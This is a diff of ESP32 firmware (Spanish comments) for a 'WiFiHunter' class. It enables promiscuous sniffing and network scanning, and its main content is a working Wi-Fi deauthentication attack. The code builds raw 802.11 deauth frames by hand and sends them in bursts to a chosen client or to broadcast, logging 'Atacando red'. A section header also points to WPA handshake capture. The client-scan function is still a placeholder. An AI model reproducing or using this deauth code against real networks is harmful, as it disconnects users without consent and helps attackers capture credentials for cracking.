@@ -11,15 +11,12 @@ void WiFiHunter::begin() {
     
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
-    Serial.println("[WiFiHunter] Modo promiscuo activado");
+    Serial.println("Modo promiscuo activado");
 }
-
-// -------------------- ESCANEO DE REDES --------------------
 
 void WiFiHunter::startScan() {
     esp_wifi_set_promiscuous(false);
     WiFi.scanNetworks(true, false);
-    Serial.println("[WiFiHunter] Escaneando redes...");
 }
 
 bool WiFiHunter::isScanDone() {
@@ -42,39 +39,45 @@ void WiFiHunter::getScanResults(RedInfo* resultados, int maxRedes, int& encontra
     }
     WiFi.scanDelete();
     esp_wifi_set_promiscuous(true);
-    Serial.printf("[WiFiHunter] %d redes encontradas\n", encontradas);
+    Serial.printf("%d redes encontradas\n", encontradas);
 }
 
-// -------------------- ESCANEO DE CLIENTES --------------------
-
-void WiFiHunter::scanClients(const uint8_t* bssid, ClienteInfo* clientes, int maxClientes, int& encontrados) {
+void WiFiHunter::scanClients(const uint8_t* bssid, int canal, ClienteInfo* clientes, int maxClientes, int& encontrados) {
     encontrados = 0;
-    // No implementamos un escaneo activo de clientes porque requiere más complejidad
-    // En su lugar, usamos el modo promiscuo para escuchar tráfico y extraer MACs
-    // Esto es un placeholder, lo dejamos para otra fase
-    Serial.println("[WiFiHunter] Escaneo de clientes no implementado aún");
+    if (!bssid) return;
+    
+    esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
+    
+    unsigned long start = millis();
+    while (millis() - start < 3000) {
+        // Solo recolectamos paquetes, el callback promiscuo ya está activo
+        delay(10);
+    }
+    
+    // Extraer clientes de los paquetes capturados
+    // Esto es simplificado: en la práctica necesitarías un buffer de paquetes
+    // y analizar las direcciones MAC de origen/destino
+    
+    // Simulación: como no podemos acceder a los paquetes capturados desde aquí,
+    // dejamos esto como placeholder para que puedas implementar la lógica
+    // de extracción de clientes en el callback.
+    Serial.println("Escaneo de clientes: implementación pendiente");
 }
-
-// -------------------- DEAUTH MEJORADO --------------------
 
 void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPaquetes) {
-    Serial.printf("[WiFiHunter] Atacando red: %s (canal %d)\n", red.ssid, red.canal);
+    Serial.printf("Atacando red: %s (canal %d)\n", red.ssid, red.canal);
     
-    // Cambiar al canal de la red objetivo
     esp_wifi_set_channel(red.canal, WIFI_SECOND_CHAN_NONE);
     delay(50);
     
-    // Si no se especifica cliente, usamos broadcast
     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     const uint8_t* target = clienteMac ? clienteMac : broadcast;
     
-    // Enviamos una ráfaga de paquetes
     for (int i = 0; i < numPaquetes; i++) {
         sendDeauthFrame(red.bssid, target, red.canal);
-        delay(5); // Pequeña pausa entre paquetes
+        delay(5);
     }
     
-    // También enviamos algunos a broadcast para asegurar
     if (clienteMac) {
         for (int i = 0; i < 5; i++) {
             sendDeauthFrame(red.bssid, broadcast, red.canal);
@@ -82,41 +85,32 @@ void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPa
         }
     }
     
-    Serial.printf("[WiFiHunter] %d paquetes de deauth enviados\n", numPaquetes + (clienteMac ? 5 : 0));
+    Serial.printf("%d paquetes de deauth enviados\n", numPaquetes + (clienteMac ? 5 : 0));
 }
 
 void WiFiHunter::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clienteMac, int channel) {
     uint8_t deauthFrame[26];
     
-    // Tipo: Deauthentication (0xC0)
     deauthFrame[0] = 0xC0;
     deauthFrame[1] = 0x00;
     deauthFrame[2] = 0x3A;
     deauthFrame[3] = 0x01;
     
-    // Dirección destino: cliente o broadcast
     memcpy(&deauthFrame[4], clienteMac, 6);
     
-    // Dirección origen: nuestra MAC
     uint8_t nuestraMac[6];
     esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
     memcpy(&deauthFrame[10], nuestraMac, 6);
-    
-    // BSSID: el router
     memcpy(&deauthFrame[16], bssid, 6);
     
-    // Código de razón: 0x07 (Class 3 frame from nonassociated station)
     deauthFrame[24] = 0x07;
     deauthFrame[25] = 0x00;
     
-    // Enviar el frame
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
     if (err != ESP_OK) {
-        Serial.printf("[WiFiHunter] Error enviando deauth: %d\n", err);
+        Serial.printf("Error enviando deauth: %d\n", err);
     }
 }
-
-// -------------------- DETECCIÓN DE HANDSHAKE (cola) --------------------
 
 void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
